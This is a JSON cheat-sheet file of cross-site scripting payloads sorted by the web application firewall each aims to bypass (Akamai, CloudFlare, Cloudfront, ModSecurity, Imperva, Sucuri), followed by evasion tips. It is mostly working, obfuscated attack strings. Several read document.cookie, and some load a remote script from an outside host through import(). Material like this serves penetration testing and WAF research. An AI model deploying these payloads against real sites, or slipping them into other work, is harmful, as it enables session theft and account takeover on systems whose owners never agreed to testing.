{
    "id": "xss-waf-bypass",
    "title": "XSS WAF Bypass Methodology",
    "category": "Web Security",
    "command_groups": [
        {
            "subtitle": "Akamai WAF Bypasses",
            "info": "Payloads specifically crafted to bypass Akamai WAF protection",
            "commands": [
                "';k='e'%0Atop['al'+k+'rt'](1)//",
                "'><A HRef=' AutoFocus OnFocus=top//?.['ale'%2B'rt'](1)>"
            ]
        },
        {
            "subtitle": "CloudFlare WAF Bypasses",
            "info": "Collection of payloads effective against CloudFlare WAF",
            "commands": [
                "<svg/onload=window['al'+'ert']1337>",
                "<Svg Only=1 OnLoad=confirm(document.cookie)>",
                "<svg onload=alert&#0000000040document.cookie)>",
                "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E",
                "<sVG/oNLY%3d1//On+ONloaD%3dco\\u006efirm%26%23x28%3b%26%23x29%3b>",
                "<Img Src=//X55.is OnLoad%0C=import(Src)>",
                "<Img Src=OnXSS OnError=prompt(1337)>",
                "<Img Src=OnXSS OnError=prompt(document.cookie)>",
                "<Svg Only=1 OnLoad=confirm(atob('Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=='))>"
            ]
        },
        {
            "subtitle": "Cloudfront WAF Bypasses",
            "info": "Specialized payloads for bypassing Cloudfront WAF protection",
            "commands": [
                "'>'><details/open/ontoggle=confirm('XSS')>",
                "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
                "';window/aabb/['al'%2b'ert'](document./aabb/location);//",
                "'>%0D%0A%0D%0A<x '='foo'><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//>'>"
            ]
        },
        {
            "subtitle": "ModSecurity WAF Bypasses",
            "info": "Payloads designed to evade ModSecurity WAF rules",
            "commands": [
                "<svg onload='new Function['Y000!'].find(al\\u0065rt)'>"
            ]
        },
        {
            "subtitle": "Imperva WAF Bypasses",
            "info": "Advanced techniques for bypassing Imperva WAF protection",
            "commands": [
                "<Img Src=//X55.is OnLoad%0C=import(Src)>",
                "<sVg OnPointerEnter='location=javas+cript:ale+rt%2+81%2+9;//</div'>",
                "<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>",
                "<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle='propmt(document.cookie);'>"
            ]
        },
        {
            "subtitle": "Sucuri WAF Bypasses",
            "info": "Effective payloads for bypassing Sucuri WAF protection",
            "commands": [
                "<A HREF='https://www.cia.gov/'>Click Here </A>",
                "'><img src=x onerror=alert(document.cookie)>",
                "<button onClick='prompt(1337)'>Submit</button>",
                "<a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(1337)>ClickMe",
                "<a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe",
                "<a href='j&#97;vascript&#x3A;&#97;lert('Sucuri WAF Bypassed ! ' + document.domain + '\\nCookie: ' + document.cookie); window&#46;location&#46;href='https://github.com/coffinxp';'>ClickMe</a>"
            ]
        }
    ],
    "tips": [
        "Test payloads against specific WAF versions",
        "Combine multiple encoding techniques",
        "Use different event handlers to bypass filters",
        "Try mixing HTML and JavaScript encoding",
        "Leverage legitimate HTML attributes",
        "Test with and without quotes/double quotes",
        "Use different case combinations",
        "Try adding multiple attributes",
        "Document successful bypasses for each WAF",
        "Always verify payload execution in the target context"
    ]
} 
